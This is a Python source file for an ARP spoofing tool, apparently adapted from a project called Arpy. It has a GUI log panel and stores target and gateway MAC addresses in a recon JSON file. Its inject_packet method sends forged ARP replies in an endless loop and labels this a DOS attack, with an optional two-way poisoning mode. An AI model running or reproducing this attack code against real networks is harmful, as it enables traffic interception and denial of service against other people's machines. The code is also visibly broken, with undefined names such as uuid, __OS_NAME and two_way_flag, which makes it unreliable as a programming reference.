

"""WARNING: This code is mess don't even bother looking at it"""


#imports
from scapy.all import *
from collections import OrderedDict
from uuid import getnode
from time import sleep, strftime

import argparse
import os
import ipaddress as ip 
import threading
import queue
import customtkinter
import sys
import json

RECON_PATH = "./recon/recon.json"


class Arpy:
    """This program is a modified of Arpy(https://github.com/Haz3l-cmd/Arpy) and can interface with netnum.py
    """
    
    MODULE_NAME = "Arpy"
    LOCAL_MAC =  ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0,8*6,8)][::-1])

    #Variables that should not be altered
    
    def __init__(self, target:str = None, gateway:str = None, output_frame = None):
        """This method initialises the object and validates the object attributes
           
           :param target: IP address of target
           :param gateway: IP address of gateway
        """
        self.target_mac = None 
        self.interval = None
        self.target = target
        self.gateway = gateway
        self.frame = output_frame
        self.is_gateway = False
        self.two_way = False
        
        if self.target == self.gateway:
           self.is_gateway = True

        
    def __repr__(self):
        MSG = f""" 
IP: {self.target}
MAC: {self.target_mac}
is_gateway: {self.is_gateway}
"""
        return MSG

    def UI(self)->None:
        """This method initialises the info panel for the user

           :Return
        """
        
        self.insert(text="Object attributes seem ok")
        
        if self.__OS_NAME == "nt":
           self.insert(text="Windows detected as OS")
        
        elif self.__OS_NAME == "posix":
             self.insert(text="Linux detected as OS, you may need to run the program as root")

        
        else:    
           self.err_insert(text="[-]Unknown OS, exiting module to prevent possible compatibility issues")

        if self.two_way_flag :
           # label3 = customtkinter.CTkLabel(master=self.frame, text = "[*] Two way poisoning: Enabled")
           # label3.pack(pady=5)
           self.insert(text="Two way poisoning: Enabled")

        else:
            self.insert(text = "Two way poisoning: Disabled") 
           
        

    
    def get_mac(self,target:str = None)->None:
        """This method is retrieves MAC address of target using ARP, upon successful reply, self.target_mac is updated

           :param target: The IP address of the target,
        """
        try:
            arp_ans = sr1(ARP(pdst=target,hwlen=6,plen=4, op=1), verbose=False,timeout=1)
            self.target_mac = arp_ans[0].hwsrc
    
        except TypeError:
            
            sys.exit()


            
        
        
             
    def save(self):        
        if self.target_mac is not None:
            with open(RECON_PATH, "r") as fp:
                 data = fp.read()
            if data:
               data = json.loads(data)
               data.update({self.target:{"MAC":self.target_mac,
                                          "is_gateway":self.is_gateway}})
            else:
                data = {self.target:{"MAC":self.target_mac,
                                          "is_gateway":self.is_gateway}}
            with open(RECON_PATH, "w") as fp:
                 json.dump(data, fp, indent=4)
            
            self.insert(text=f"{self.target} --> {self.target_mac}")
            # self.insert(text="Retrieved information has been temporarily saved in /recon/recon.json")
        else:
            pass


    def inject_packet(self, IP):
            """Not implemented, need to be modified
            """
        
            try:

                 with open(RECON_PATH, "r") as fp:
                      data = json.load(fp)
                 for key, value in data.items():
                     if value.get("is_gateway") is True:
                        GMAC = value.get("MAC")
                        GIP = key
                 unsolicited_arp_rep_to_tgt = ARP(op=2,psrc=GIP, pdst=self.target, hwdst=self.target_mac)
                 unsolicited_arp_rep_to_gtw = ARP(op=2,psrc=self.target, pdst=GIP, hwdst=GMAC, hwsrc=self.LOCAL_MAC)
                 count = 1
                 sys.stdout.write("DOS attack in progress. Press CTRL+C to end\n")
                 
                                                                     
                 while True :
                     send(unsolicited_arp_rep_to_tgt,verbose=False)
                     if self.two_way:
                        # send(unsolicited_arp_rep_to_gtw, verbose=False)
                        print("To router")
                     sys.stdout.write("   Packet(s) sent : {}\r".format(count))
                     count += 1
                     sleep(self.interval)
            except KeyboardInterrupt:
                print("\nUser ended program")
    
    def insert(self, text:str =None)->None:
        """This method outputs message to info panel, you can think of it as redirecting stdout to info panel
           
           :param text: text to ouput
           :Return:None
        """
        self.frame.configure(text_color="lime green")
        self.frame.configure(state="normal")
        self.frame.insert(index="end", text="\n[{}] (Using {}) : [+] {}".format(strftime("%H:%M:%S"),self.MODULE_NAME, text))
        self.frame.configure(state="disabled")
    
    
    def err_insert(self, text=None):
        """This method outputs error message to info panel, you can think of it as redirecting stderr to info panel
           
           :param text: text to ouput
           :Return:None
        """
        self.frame.configure(text_color="orange")
        self.frame.configure(state="normal")
        self.frame.insert(index="end", text="\n[{}] (Using {}) : [-] {}".format(strftime("%H:%M:%S"),self.MODULE_NAME, text))
        self.frame.configure(state="disabled")

        
            







